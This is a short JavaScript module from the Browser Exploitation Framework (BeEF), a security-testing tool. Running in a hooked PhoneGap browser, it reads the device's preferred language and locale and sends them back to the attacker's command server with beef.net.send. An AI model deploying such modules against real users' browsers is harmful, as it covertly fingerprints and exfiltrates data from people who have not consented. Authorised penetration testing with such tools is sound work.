//
// Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

// Phonegap_globalization_status
//
beef.execute(function() {
    var result = '';

    navigator.globalization.getPreferredLanguage(
  		function (language) {
  			result = 'language: ' + language.value + '\n';
        beef.net.send("<%= @command_url %>", <%= @command_id %>, 'result='+result );
  		}, 
  		function () {
  			result = 'language: ' + 'fail\n';
        beef.net.send("<%= @command_url %>", <%= @command_id %>, 'result='+result );
  		}
	);

    navigator.globalization.getLocaleName(
  		function (locale) {
  			result = 'locale: ' + locale.value + '\n';
        beef.net.send("<%= @command_url %>", <%= @command_id %>, 'result='+result );
  		},
  		function () {
  			result = 'locale: ' + 'fail\n';
        beef.net.send("<%= @command_url %>", <%= @command_id %>, 'result='+result );
  		}
	);
    
});